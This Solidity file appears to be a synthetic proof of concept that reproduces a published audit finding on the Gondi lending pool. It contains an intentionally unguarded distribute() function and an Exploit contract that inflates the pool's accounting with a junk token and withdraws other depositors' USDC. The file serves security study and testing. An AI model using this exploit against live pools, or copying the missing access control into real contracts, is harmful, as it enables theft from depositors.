// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Gondi — [H-03] Function distribute() lacks access control allowing anyone
    to spam and disrupt the pool's accounting (Code4rena 2024-04-gondi,
    finding #35205, reporter zhaojie).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: LiquidationDistributor.distribute() is permissionless. An
    attacker crafts a fake loan whose `principalAddress` is a junk ERC20 and
    whose sole tranche `lender` is the Gondi Pool (a registered LoanManager).
    distribute() transfers the junk token INTO the Pool and then calls
    Pool.loanLiquidation(... _received ...). The Pool treats `_received` as
    its real asset (USDC/WETH), inflating available capital. An attacker who
    already holds a tiny share can then withdraw far more real USDC than they
    deposited — stealing from other depositors.

    The missing access-control surface is marked `// @> VULN:`.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Minimal LoanManager registry.
contract LoanManagerRegistry {
    mapping(address => bool) public isLoanManager;

    function set(address who, bool v) external {
        isLoanManager[who] = v;
    }
}

/// @notice Reduced Gondi Pool. Treats every loanLiquidation `_received` as an
///         inflow of its real asset, regardless of which token was actually
///         transferred (principalAddress is never passed in).
contract Pool {
    MockERC20 public immutable asset; // real USDC
    LoanManagerRegistry public immutable registry;

    uint256 public totalAssets; // accounting (can diverge from asset.balanceOf)
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf; // shares

    modifier onlyAcceptedCallers() {
        // In the real protocol, loan contracts call this. We accept any caller
        // for the reduction — the bug is on the distribute() side, which is
        // what makes an arbitrary caller able to reach us with junk data.
        _;
    }

    constructor(MockERC20 _asset, LoanManagerRegistry _registry) {
        asset = _asset;
        registry = _registry;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = totalSupply == 0 ? assets : (assets * totalSupply) / totalAssets;
        require(shares > 0, "shares");
        asset.transferFrom(msg.sender, address(this), assets);
        totalAssets += assets;
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function withdraw(uint256 shares, address receiver) external returns (uint256 assets) {
        require(balanceOf[msg.sender] >= shares, "bal");
        assets = (shares * totalAssets) / totalSupply;
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        totalAssets -= assets;
        // Pays from REAL asset balance — if accounting was inflated with junk,
        // this drains honest depositors' USDC.
        asset.transfer(receiver, assets);
    }

    /// @notice Verbatim spirit of Pool.loanLiquidation — accounts `_received`
    ///         as real asset inflow. principalAddress is never provided.
    function loanLiquidation(
        uint256, /*_loanId*/
        uint256, /*_principalAmount*/
        uint256, /*_apr*/
        uint256, /*_accrued*/
        uint256, /*_protocolFee*/
        uint256 _received,
        uint256 /*_startTime*/
    ) external onlyAcceptedCallers {
        // @audit Accounting logic — treats _received as the pool's asset
        totalAssets += _received;
    }
}

/// @notice Reduced LiquidationDistributor. distribute() has NO access control.
contract LiquidationDistributor {
    LoanManagerRegistry public immutable registry;

    struct Tranche {
        address lender;
        uint256 loanId;
        uint256 principalAmount;
        uint256 aprBps;
        uint256 accruedInterest;
        uint256 startTime;
    }

    struct Loan {
        address principalAddress;
        Tranche[] tranche;
    }

    constructor(LoanManagerRegistry _registry) {
        registry = _registry;
    }

    /// @notice @> VULN: no access control — anyone can call with a crafted loan.
    ///         FIX: only allow Loan contracts to call distribute().
    function distribute(address originator, Loan memory loan, uint256 amount) external {
        // Pull "settlement" funds (attacker-chosen token) from the caller.
        MockERC20 token = MockERC20(loan.principalAddress);
        token.transferFrom(msg.sender, address(this), amount);

        // Single-tranche reduction: send full amount to the sole lender and
        // invoke LoanManager.loanLiquidation when the lender is registered.
        Tranche memory t = loan.tranche[0];
        token.transfer(t.lender, amount);
        _handleLoanManagerCall(t, amount);
        // silence unused
        originator;
    }

    function _handleLoanManagerCall(Tranche memory _tranche, uint256 _sent) private {
        if (registry.isLoanManager(_tranche.lender)) {
            // principalAddress is NOT passed — Pool cannot validate the token.
            Pool(_tranche.lender).loanLiquidation(
                _tranche.loanId,
                _tranche.principalAmount,
                _tranche.aprBps,
                _tranche.accruedInterest,
                0,
                _sent,
                _tranche.startTime
            );
        }
    }
}

/// @notice Attacker deposits a dust of real USDC, then permissionlessly
///         "liquidates" junk tokens into the Pool to inflate totalAssets and
///         withdraw the victims' USDC.
contract Exploit {
    MockERC20 public usdc;
    MockERC20 public junk;
    LoanManagerRegistry public registry;
    Pool public pool;
    LiquidationDistributor public distributor;

    uint256 public constant VICTIM_DEPOSIT = 1000e18;
    uint256 public constant ATTACKER_DUST = 1e18;
    uint256 public constant JUNK_INFLATION = 1000e18; // inflate totalAssets by 1000

    uint256 public stolen;
    uint256 public poolUsdcAfter;

    constructor() {
        // Fixed CREATE order:
        usdc = new MockERC20("USD Coin", "USDC"); //           nonce 1
        junk = new MockERC20("Junk", "JUNK"); //               nonce 2
        registry = new LoanManagerRegistry(); //               nonce 3
        pool = new Pool(usdc, registry); //                    nonce 4
        distributor = new LiquidationDistributor(registry); // nonce 5

        registry.set(address(pool), true);

        // Victim's deposit already sits in the pool (honest liquidity).
        usdc.mint(address(this), VICTIM_DEPOSIT + ATTACKER_DUST);
        usdc.approve(address(pool), VICTIM_DEPOSIT);
        // Deposit as "victim" shares held by a distinct recipient so the
        // attacker's own shares are only the dust.
        // For simplicity: first deposit is the victim's (we'll leave those
        // shares on a burn address), second is attacker's dust.
        // Actually deposit credits msg.sender's receiver — use address(0xBEEF) for victim.
        pool.deposit(VICTIM_DEPOSIT, address(0xBEEF));

        usdc.approve(address(pool), ATTACKER_DUST);
        pool.deposit(ATTACKER_DUST, address(this));

        // Junk tokens the attacker will "distribute" as a fake liquidation.
        junk.mint(address(this), JUNK_INFLATION);
    }

    function run() external {
        // Precondition: pool holds 1001e18 real USDC; totalAssets == 1001e18;
        // attacker has ATTACKER_DUST shares, victim has VICTIM_DEPOSIT shares.
        require(usdc.balanceOf(address(pool)) == VICTIM_DEPOSIT + ATTACKER_DUST, "usdc bal");
        require(pool.totalAssets() == VICTIM_DEPOSIT + ATTACKER_DUST, "assets");
        require(pool.balanceOf(address(this)) == ATTACKER_DUST, "attacker shares");

        // Craft a fake loan: principal = JUNK, sole lender = Pool.
        LiquidationDistributor.Tranche[] memory tranches = new LiquidationDistributor.Tranche[](1);
        tranches[0] = LiquidationDistributor.Tranche({
            lender: address(pool),
            loanId: 1,
            principalAmount: JUNK_INFLATION,
            aprBps: 0,
            accruedInterest: 0,
            startTime: block.timestamp
        });
        LiquidationDistributor.Loan memory fakeLoan = LiquidationDistributor.Loan({
            principalAddress: address(junk),
            tranche: tranches
        });

        // @> attack: permissionless distribute with junk principalAddress
        junk.approve(address(distributor), JUNK_INFLATION);
        distributor.distribute(address(this), fakeLoan, JUNK_INFLATION);

        // Pool accounting now believes totalAssets = 1001e18 + 1000e18 = 2001e18
        // while real USDC is still 1001e18.
        require(pool.totalAssets() == VICTIM_DEPOSIT + ATTACKER_DUST + JUNK_INFLATION, "not inflated");
        require(usdc.balanceOf(address(pool)) == VICTIM_DEPOSIT + ATTACKER_DUST, "usdc unchanged");

        // Attacker withdraws their dust shares at the inflated exchange rate:
        // assets = 1e18 * 2001e18 / 1001e18 ≈ 2e18 — nearly double, draining victim.
        uint256 shares = pool.balanceOf(address(this));
        stolen = pool.withdraw(shares, address(this));
        poolUsdcAfter = usdc.balanceOf(address(pool));

        // HARM: attacker extracted more real USDC than they deposited, leaving
        // the victim short. Stolen ≈ 2e18 > ATTACKER_DUST (1e18).
        require(stolen > ATTACKER_DUST, "harm: did not extract excess USDC");
        require(usdc.balanceOf(address(this)) == stolen, "attacker USDC");
        require(poolUsdcAfter < VICTIM_DEPOSIT, "victim USDC not reduced");
    }
}
